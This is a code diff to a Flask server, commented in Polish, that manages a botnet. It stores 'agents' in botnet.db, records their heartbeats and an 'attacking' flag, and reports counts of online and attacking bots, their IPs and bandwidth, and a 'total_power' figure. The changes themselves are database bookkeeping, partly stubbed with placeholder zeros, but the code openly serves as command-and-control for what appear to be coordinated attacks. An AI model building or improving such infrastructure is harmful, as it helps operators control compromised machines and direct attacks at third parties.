@@ -148,20 +148,19 @@ def register():
 
 @app.route('/api/heartbeat/<agent_id>', methods=['POST'])
 def heartbeat(agent_id):
-    """Heartbeat od agenta"""
     data = request.json
     attacking = data.get('attacking', False)
     
-    conn = get_db()
-    cur = conn.cursor()
+    conn = sqlite3.connect('botnet.db')
+    c = conn.cursor()
     
-    cur.execute('''
-        UPDATE agents 
-        SET last_seen = %s, status = 'online', attacking = %s
-        WHERE id = %s
-    ''', (datetime.now(), attacking, agent_id))
+    # Zapisz last_seen jako string ISO
+    now_str = datetime.now().isoformat()
     
-    cur.close()
+    c.execute('''UPDATE agents SET last_seen = ?, status = 'online'
+                 WHERE id = ?''', (now_str, agent_id))
+    
+    conn.commit()
     conn.close()
     return jsonify({'status': 'ok'})
 
@@ -231,30 +230,56 @@ def stop_attack():
 @app.route('/api/stats')
 def get_stats():
     """Statystyki"""
-    conn = get_db()
-    cur = conn.cursor(cursor_factory=RealDictCursor)
+    conn = sqlite3.connect('botnet.db')
+    c = conn.cursor()
     
     # Wszyscy agenci
-    cur.execute('SELECT COUNT(*) as count FROM agents')
-    total_bots = cur.fetchone()['count']
+    c.execute("SELECT COUNT(*) FROM agents")
+    total_bots = c.fetchone()[0]
     
     # Online (ostatnie 60 sekund)
     threshold = datetime.now() - timedelta(seconds=60)
-    cur.execute('SELECT COUNT(*) as count FROM agents WHERE last_seen > %s', (threshold,))
-    online_bots = cur.fetchone()['count']
     
-    # Atakujący
-    cur.execute('SELECT COUNT(*) as count FROM agents WHERE last_seen > %s AND attacking = TRUE', (threshold,))
-    attacking_bots = cur.fetchone()['count']
+    # Pobierz wszystkich agentów i ręcznie sprawdź online
+    c.execute("SELECT id, hostname, platform, ip, bandwidth, status, last_seen FROM agents")
+    agents = []
+    online_bots = 0
+    attacking_bots = 0
     
-    cur.close()
+    for row in c.fetchall():
+        # Konwersja last_seen ze stringa na datetime
+        try:
+            last_seen = datetime.fromisoformat(row[6].replace('Z', '+00:00'))
+        except:
+            last_seen = datetime.now() - timedelta(days=1)  # stary agent
+        
+        # Sprawdź czy online
+        is_online = last_seen > threshold
+        if is_online:
+            online_bots += 1
+            
+            # Sprawdź czy atakuje - jeśli brak kolumny attacking, zakładamy False
+            attacking_bots += 0  # tymczasowo 0
+        
+        agents.append({
+            'id': row[0],
+            'hostname': row[1],
+            'platform': row[2],
+            'ip': row[3],
+            'bandwidth': row[4] or '100Mbps',
+            'status': 'online' if is_online else 'offline',
+            'last_seen': last_seen.strftime('%H:%M:%S')
+        })
+    
     conn.close()
     
     return jsonify({
         'total_bots': total_bots,
         'online_bots': online_bots,
         'attacking_bots': attacking_bots,
-        'total_power': attacking_bots * 100
+        'total_power': attacking_bots * 100,
+        'agents': agents,
+        'history': []  # tymczasowo puste
     })
 
 if __name__ == '__main__':
